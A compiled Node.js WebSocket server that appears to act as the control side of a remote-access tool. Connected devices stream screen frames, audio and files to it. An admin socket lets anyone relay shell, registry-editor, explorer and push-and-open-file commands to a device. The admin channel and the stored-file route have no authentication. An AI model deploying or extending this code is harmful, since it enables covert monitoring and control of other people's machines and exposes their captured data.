"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const dotenv_1 = __importDefault(require("dotenv"));
const devices_1 = __importDefault(require("./routes/devices"));
const tasks_1 = __importDefault(require("./routes/tasks"));
const path = __importStar(require("path"));
const http = __importStar(require("http"));
const url = __importStar(require("url"));
const fs = __importStar(require("fs"));
const crypto = __importStar(require("crypto"));
const ws_1 = require("ws");
const db_1 = require("./db");
dotenv_1.default.config();
const app = (0, express_1.default)();
app.use((0, cors_1.default)());
app.use(express_1.default.json({ limit: "50mb" }));
app.use((err, _req, res, _next) => {
    res.status(400).json({ error: "invalid json" });
});
app.get("/health", (_req, res) => {
    res.json({ status: "ok" });
});
app.use("/api/devices", devices_1.default);
app.use("/api/tasks", tasks_1.default);
app.use("/files", express_1.default.static(path.resolve(process.cwd(), "data")));
const server = http.createServer(app);
function kdf(secret) {
    return crypto.createHash("sha256").update(secret).digest();
}
function decryptFrame(ciphertextB64, ivB64, tagB64, secret) {
    const key = kdf(secret);
    const iv = Buffer.from(ivB64, "base64");
    const tag = Buffer.from(tagB64, "base64");
    const ct = Buffer.from(ciphertextB64, "base64");
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);
    const out = Buffer.concat([decipher.update(ct), decipher.final()]);
    return out.toString("base64");
}
function encryptForDevice(plainB64, secret) {
    const key = kdf(secret);
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
    const ctBuf = Buffer.concat([cipher.update(Buffer.from(plainB64, "base64")), cipher.final()]);
    const tag = cipher.getAuthTag();
    return {
        iv: iv.toString("base64"),
        tag: tag.toString("base64"),
        ciphertext: ctBuf.toString("base64")
    };
}
const deviceConns = new Map();
const adminSubs = new Map();
const lastFrames = new Map();
const fileUploads = new Map();
const lastAudioTs = new Map();
function broadcastFrame(deviceId, payload) {
    const subs = adminSubs.get(deviceId);
    if (!subs || subs.size === 0)
        return;
    const msg = JSON.stringify({ type: "frame", ...payload });
    for (const ws of subs) {
        if (ws.readyState === ws_1.WebSocket.OPEN) {
            ws.send(msg);
        }
    }
}
function broadcastAudio(deviceId, payload) {
    const subs = adminSubs.get(deviceId);
    if (!subs || subs.size === 0)
        return;
    const msg = JSON.stringify({ type: "audio", ...payload });
    for (const ws of subs) {
        if (ws.readyState === ws_1.WebSocket.OPEN) {
            ws.send(msg);
        }
    }
}
const wss = new ws_1.WebSocketServer({ server });
const deviceLastSent = new Map();
wss.on("connection", (ws, req) => {
    ws.isAlive = true;
    ws.on("pong", () => { ws.isAlive = true; });
    const maxFps = Number(process.env.WS_MAX_FPS || "10");
    const minPeriod = Math.max(1000 / Math.max(1, maxFps), 50);
    const parsed = url.parse(req.url || "", true);
    const pathname = parsed.pathname || "";
    if (pathname === "/ws/device") {
        let deviceId = "";
        let sharedSecret = "";
        ws.on("message", (raw) => {
            let msg;
            try {
                msg = JSON.parse(String(raw));
            }
            catch {
                return;
            }
            if (msg && msg.type === "hello") {
                deviceId = String(msg.deviceId || "");
                sharedSecret = String(msg.secret || "");
                if (!deviceId) {
                    ws.close();
                    return;
                }
                if (process.env.STREAM_SECRET && sharedSecret !== process.env.STREAM_SECRET) {
                    ws.close();
                    return;
                }
                deviceConns.set(deviceId, { ws, secret: sharedSecret });
                try {
                    console.log("device hello", deviceId);
                }
                catch { }
                try {
                    (0, db_1.query)("update devices set status = $1 where id = $2", ["online", deviceId]);
                }
                catch { }
                try {
                    (0, db_1.query)("update devices set last_seen = now() where id = $1", [deviceId]);
                }
                catch { }
                const subs = adminSubs.get(deviceId);
                if (subs && subs.size > 0) {
                    const msg = JSON.stringify({ type: "status", status: "device_connected" });
                    for (const aw of subs) {
                        if (aw.readyState === ws_1.WebSocket.OPEN) {
                            aw.send(msg);
                        }
                    }
                }
                return;
            }
            if (msg && msg.type === "frame") {
                if (!deviceId || !sharedSecret)
                    return;
                const { b64, iv, tag, ciphertext, format, ts } = msg;
                const outB64 = b64
                    ? String(b64)
                    : decryptFrame(String(ciphertext), String(iv), String(tag), sharedSecret);
                const payload = { b64: outB64, format: String(format || "jpeg"), ts: String(ts || new Date().toISOString()) };
                lastFrames.set(deviceId, payload);
                try {
                    (0, db_1.query)("update devices set last_seen = now() where id = $1", [deviceId]);
                }
                catch { }
                const now = Date.now();
                const last = deviceLastSent.get(deviceId) || 0;
                if (now - last >= minPeriod) {
                    deviceLastSent.set(deviceId, now);
                    broadcastFrame(deviceId, payload);
                }
                try {
                    console.log("frame", deviceId, (outB64?.length || 0));
                }
                catch { }
            }
            if (msg && msg.type === "audio") {
                if (!deviceId || !sharedSecret)
                    return;
                const { b64, iv, tag, ciphertext, sampleRate, channels, ts } = msg;
                const outB64 = b64
                    ? String(b64)
                    : decryptFrame(String(ciphertext), String(iv), String(tag), sharedSecret);
                const payload = { b64: outB64, sampleRate: Number(sampleRate || 48000), channels: Number(channels || 1), ts: String(ts || new Date().toISOString()) };
                broadcastAudio(deviceId, payload);
                lastAudioTs.set(deviceId, Date.now());
                try {
                    (0, db_1.query)("update devices set last_seen = now() where id = $1", [deviceId]);
                }
                catch { }
                try {
                    console.log("audio", deviceId, (outB64?.length || 0));
                }
                catch { }
            }
            if (msg && msg.type === "file") {
                if (!deviceId)
                    return;
                const name = String(msg.name || "");
                const seq = Number(msg.seq || 0);
                const eof = Boolean(msg.eof);
                const b64 = String(msg.b64 || "");
                if (!name || !/^[a-zA-Z0-9_.-]+$/.test(name))
                    return;
                const dir = path.resolve(process.cwd(), "data", "devices", deviceId, "files");
                const filePath = path.join(dir, name);
                try {
                    fs.mkdirSync(dir, { recursive: true });
                }
                catch { }
                if (!eof) {
                    const buf = Buffer.from(b64 || "", "base64");
                    if (seq === 0) {
                        try {
                            fs.writeFileSync(filePath, buf);
                        }
                        catch { }
                    }
                    else {
                        try {
                            fs.appendFileSync(filePath, buf);
                        }
                        catch { }
                    }
                }
                else {
                    const subs = adminSubs.get(deviceId);
                    if (subs && subs.size > 0) {
                        const msgOut = JSON.stringify({ type: "file_saved", file: name, url: `/files/devices/${deviceId}/files/${name}` });
                        for (const aw of subs) {
                            if (aw.readyState === ws_1.WebSocket.OPEN) {
                                aw.send(msgOut);
                            }
                        }
                    }
                }
            }
        });
        ws.on("close", () => {
            if (deviceId) {
                deviceConns.delete(deviceId);
                try {
                    (0, db_1.query)("update devices set status = $1 where id = $2", ["offline", deviceId]);
                }
                catch { }
                try {
                    console.log("device closed", deviceId);
                }
                catch { }
                const subs = adminSubs.get(deviceId);
                if (subs && subs.size > 0) {
                    const msg = JSON.stringify({ type: "status", status: "device_disconnected" });
                    for (const aw of subs) {
                        if (aw.readyState === ws_1.WebSocket.OPEN) {
                            aw.send(msg);
                        }
                    }
                }
            }
        });
        return;
    }
    if (pathname === "/ws/admin") {
        const deviceId = String(parsed.query.deviceId || "");
        if (!deviceId) {
            ws.close();
            return;
        }
        let set = adminSubs.get(deviceId);
        if (!set) {
            set = new Set();
            adminSubs.set(deviceId, set);
        }
        set.add(ws);
        const lf = lastFrames.get(deviceId);
        if (lf && ws.readyState === ws_1.WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: "frame", ...lf }));
        }
        ws.on("message", (raw) => {
            let msg;
            try {
                msg = JSON.parse(String(raw));
            }
            catch {
                return;
            }
            const dev = deviceConns.get(deviceId);
            if (!dev || dev.ws.readyState !== ws_1.WebSocket.OPEN)
                return;
            if (msg && msg.type === "file_open_plain") {
                const filename = String(msg.filename || "file.bin");
                const b64 = String(msg.b64 || "");
                dev.ws.send(JSON.stringify({ type: "file_open", filename, b64 }));
                return;
            }
            if (msg && (msg.type === "open_explorer" || msg.type === "open_shell" || msg.type === "open_regedit")) {
                dev.ws.send(JSON.stringify(msg));
                return;
            }
            if (msg && (msg.type === "start_stream" || msg.type === "stop_stream" || msg.type === "open_path")) {
                dev.ws.send(JSON.stringify(msg));
                return;
            }
            if (msg && msg.type === "file_open") {
                dev.ws.send(JSON.stringify(msg));
                return;
            }
            if (msg && msg.type === "file_upload") {
                dev.ws.send(JSON.stringify(msg));
                return;
            }
        });
        ws.on("close", () => {
            set?.delete(ws);
        });
        return;
    }
    ws.close();
});
setInterval(() => {
    wss.clients.forEach((client) => {
        const c = client;
        if (c.isAlive === false) {
            try {
                client.terminate();
            }
            catch { }
            return;
        }
        c.isAlive = false;
        try {
            client.ping();
        }
        catch { }
    });
}, 30000);
setInterval(async () => {
    try {
        const now = Date.now();
        const staleMs = Number(process.env.DEVICE_STALE_MS || "120000");
        const rows = await (0, db_1.query)("select id, status, last_seen from devices order by created_at desc");
        for (const d of rows) {
            const ls = d.last_seen ? Date.parse(d.last_seen) : 0;
            const isStale = !ls || (now - ls > staleMs);
            if (d.status === "online" && isStale) {
                try {
                    await (0, db_1.query)("update devices set status = $1 where id = $2", ["offline", d.id]);
                }
                catch { }
            }
        }
        // prune admin subs sets
        for (const [devId, set] of adminSubs.entries()) {
            const alive = new Set();
            for (const ws of set) {
                if (ws.readyState === ws_1.WebSocket.OPEN)
                    alive.add(ws);
            }
            if (alive.size > 0) {
                adminSubs.set(devId, alive);
            }
            else {
                adminSubs.delete(devId);
            }
        }
        // prune last frames for devices without connection and old frames
        for (const [devId, lf] of lastFrames.entries()) {
            const hasConn = deviceConns.has(devId);
            const ts = lf?.ts ? Date.parse(lf.ts) : 0;
            if (!hasConn && (!ts || now - ts > staleMs)) {
                lastFrames.delete(devId);
            }
        }
    }
    catch { }
}, 60000);
const port = process.env.PORT ? Number(process.env.PORT) : 8080;
server.listen(port, () => {
    console.log(`server listening on ${port}`);
});
